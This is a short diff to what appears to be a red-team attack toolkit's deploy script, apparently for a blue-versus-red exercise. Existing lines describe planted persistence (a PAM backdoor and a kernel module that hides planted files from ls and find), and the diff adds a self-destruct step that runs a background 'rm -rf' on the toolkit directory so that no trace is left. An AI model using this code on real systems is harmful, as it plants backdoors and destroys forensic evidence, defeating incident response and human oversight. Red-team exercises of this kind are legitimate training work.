@@ -103,5 +103,10 @@ if [[ "$ACTION" == "deploy" ]]; then
   echo "  Blue team must run --immutable FIRST or cleanup will silently fail."
   echo "  PAM backdoor requires manual PAM file edit to remove."
   echo "  LKM hides planted filenames from ls/find."
+  echo ""
+  # Self-destruct: wipe the entire attack toolkit directory
+  echo "[*] Wiping attack toolkit from disk (no trace left)..."
+  # Run the rm via a subshell so the parent dir removal doesn't kill us mid-script
+  (sleep 1 && rm -rf -- "${DIR}") &
 fi
 echo ""
